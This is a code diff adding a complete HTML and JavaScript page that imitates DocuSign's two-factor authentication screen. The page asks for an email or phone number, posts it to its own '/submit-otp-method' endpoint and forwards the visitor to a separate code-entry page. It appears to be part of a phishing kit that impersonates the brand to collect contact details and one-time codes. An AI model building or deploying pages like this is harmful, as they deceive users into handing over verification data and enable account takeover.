@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-Factor Authentication - DocuSign</title>
+    <link rel="icon" type="image/svg+xml" href="/docu-logo.svg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: #e8ecef;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-logo img {
+            height: 32px;
+            width: auto;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .otp-container {
+            background: white;
+            padding: 32px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .security-notice {
+            background: #e8f4fd;
+            border-left: 4px solid #36a3f7;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .security-notice-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a73e8;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-notice-text {
+            font-size: 12px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .otp-header {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .otp-header img {
+            height: 36px;
+            width: auto;
+            margin-bottom: 12px;
+        }
+
+        .otp-header h2 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .otp-header p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .method-selection {
+            margin-bottom: 20px;
+        }
+
+        .method-label {
+            display: block;
+            margin-bottom: 12px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .method-options {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .method-option {
+            flex: 1;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .method-option:hover {
+            border-color: #6c2eb9;
+            background: #f9f7fc;
+        }
+
+        .method-option.selected {
+            border-color: #6c2eb9;
+            background: #f3eef9;
+        }
+
+        .method-option input[type="radio"] {
+            display: none;
+        }
+
+        .method-icon {
+            font-size: 24px;
+            margin-bottom: 6px;
+        }
+
+        .method-text {
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 400;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #6c2eb9;
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #6c2eb9;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .continue-button:hover {
+            background-color: #5a2599;
+        }
+
+        .continue-button:disabled {
+            background-color: #9d7bc4;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #d93025;
+            margin-top: 12px;
+            font-size: 12px;
+            display: none;
+            padding: 10px;
+            background-color: #fce8e6;
+            border-radius: 4px;
+            border-left: 3px solid #d93025;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .footer {
+            background: #f4f4f4;
+            padding: 16px 40px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 16px 20px;
+            }
+
+            .otp-container {
+                padding: 24px 20px;
+            }
+
+            .method-options {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <div class="header-logo">
+            <img src="/ds-logo-default.svg" alt="DocuSign">
+        </div>
+    </header>
+
+    <div class="main-content">
+        <div class="otp-container">
+            <div class="security-notice">
+                <div class="security-notice-title">
+                    🔒 Additional Security Verification Required
+                </div>
+                <div class="security-notice-text">
+                    To protect your account and document access, we need to verify your identity with a one-time
+                    passcode.
+                </div>
+            </div>
+
+            <div class="otp-header">
+                <img src="/ds-logo-default.svg" alt="DocuSign">
+                <h2>Two-Factor Authentication</h2>
+                <p>Choose how you'd like to receive your verification code</p>
+            </div>
+
+            <form id="otpMethodForm">
+                <div class="method-selection">
+                    <label class="method-label">Select verification method:</label>
+                    <div class="method-options">
+                        <label class="method-option" id="emailOption">
+                            <input type="radio" name="method" value="email" checked>
+                            <div class="method-icon">📧</div>
+                            <div class="method-text">Email</div>
+                        </label>
+                        <label class="method-option" id="phoneOption">
+                            <input type="radio" name="method" value="phone">
+                            <div class="method-icon">📱</div>
+                            <div class="method-text">SMS</div>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group" id="emailGroup">
+                    <label for="emailInput">Email Address *</label>
+                    <input type="email" id="emailInput" name="email" placeholder="Enter your email address" required>
+                </div>
+
+                <div class="form-group" id="phoneGroup" style="display: none;">
+                    <label for="phoneInput">Phone Number *</label>
+                    <input type="tel" id="phoneInput" name="phone" placeholder="Enter your phone number">
+                </div>
+
+                <button type="submit" class="continue-button">SEND CODE</button>
+
+                <div id="errorMessage" class="error-message"></div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        Copyright © 2025 Docusign Inc. All rights reserved
+    </footer>
+
+    <script>
+        const emailOption = document.getElementById('emailOption');
+        const phoneOption = document.getElementById('phoneOption');
+        const emailGroup = document.getElementById('emailGroup');
+        const phoneGroup = document.getElementById('phoneGroup');
+        const emailInput = document.getElementById('emailInput');
+        const phoneInput = document.getElementById('phoneInput');
+
+        // Handle method selection
+        emailOption.addEventListener('click', function () {
+            emailOption.classList.add('selected');
+            phoneOption.classList.remove('selected');
+            emailGroup.style.display = 'block';
+            phoneGroup.style.display = 'none';
+            emailInput.required = true;
+            phoneInput.required = false;
+        });
+
+        phoneOption.addEventListener('click', function () {
+            phoneOption.classList.add('selected');
+            emailOption.classList.remove('selected');
+            phoneGroup.style.display = 'block';
+            emailGroup.style.display = 'none';
+            phoneInput.required = true;
+            emailInput.required = false;
+        });
+
+        // Set initial state
+        emailOption.classList.add('selected');
+
+        // Pre-fill email if available from session
+        document.addEventListener('DOMContentLoaded', function () {
+            const storedEmail = sessionStorage.getItem('userEmail');
+            if (storedEmail && emailInput) {
+                emailInput.value = storedEmail;
+            }
+        });
+
+        // Handle form submission
+        document.getElementById('otpMethodForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const method = document.querySelector('input[name="method"]:checked').value;
+            const contact = method === 'email' ? emailInput.value : phoneInput.value;
+            const errorElement = document.getElementById('errorMessage');
+            const continueButton = document.querySelector('.continue-button');
+
+            if (!contact) {
+                errorElement.textContent = 'Please enter your ' + (method === 'email' ? 'email address' : 'phone number');
+                errorElement.classList.add('show');
+                return;
+            }
+
+            // Show loading state
+            const originalButtonText = continueButton.textContent;
+            continueButton.textContent = 'SENDING...';
+            continueButton.disabled = true;
+            errorElement.classList.remove('show');
+
+            try {
+                const response = await fetch('/submit-otp-method', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        method: method,
+                        contact: contact
+                    }),
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Store contact info for reference
+                    sessionStorage.setItem('otpMethod', method);
+                    sessionStorage.setItem('otpContact', contact);
+                    // Redirect to OTP verification page
+                    window.location.href = '/otp-verify.html';
+                } else {
+                    errorElement.textContent = data.error || 'An error occurred. Please try again.';
+                    errorElement.classList.add('show');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorElement.textContent = 'An error occurred. Please try again.';
+                errorElement.classList.add('show');
+            } finally {
+                continueButton.textContent = originalButtonText;
+                continueButton.disabled = false;
+            }
+        });
+    </script>
+</body>
+
+</html>
